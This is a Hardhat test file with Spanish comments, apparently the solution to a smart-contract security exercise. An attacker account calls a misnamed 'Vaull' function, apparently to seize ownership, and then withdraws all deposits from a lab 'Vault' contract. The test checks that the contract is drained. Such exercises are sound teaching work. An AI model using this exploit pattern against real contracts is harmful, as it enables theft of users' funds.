const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Ejercicio 1", function () {

  let deployer, atacante;

  beforeEach(async function () {

    [deployer, atacante] = await ethers.getSigners();

    // Deployamos el contrato vulnerable con la cuenta "deployer"
    const Vault = await ethers.getContractFactory("Vault", deployer);
    this.contrato = await Vault.deploy();

    // Deployer deposita 10 ETH
    await this.contrato.deposit({ value: ethers.utils.parseEther('10') });
    let balance = await ethers.provider.getBalance(this.contrato.address);
    expect(balance).to.eq(ethers.utils.parseEther('10'));
    console.log(
      `El balance inicial del contrato es: ${ethers.utils.formatEther(balance)}`
    );
  });

  it("Ataque", async function () {
    console.log('atacante Balance inicial es: '+ethers.utils.formatEther(await ethers.provider.getBalance(atacante.address)));
    await this.contrato.connect(atacante).Vaull();
    await this.contrato.connect(atacante).withdrawAllDeposits();
    console.log('atacante nuevo Balance es: '+ethers.utils.formatEther(await ethers.provider.getBalance(atacante.address)));
    console.log('contrato nuevo Balance es: '+ethers.utils.formatEther(await ethers.provider.getBalance(this.contrato.address)));
    // Se espera que nuevo saldo del contrato sea igual a cero
    expect(await ethers.provider.getBalance(this.contrato.address)).to.eq(0);
  });
});
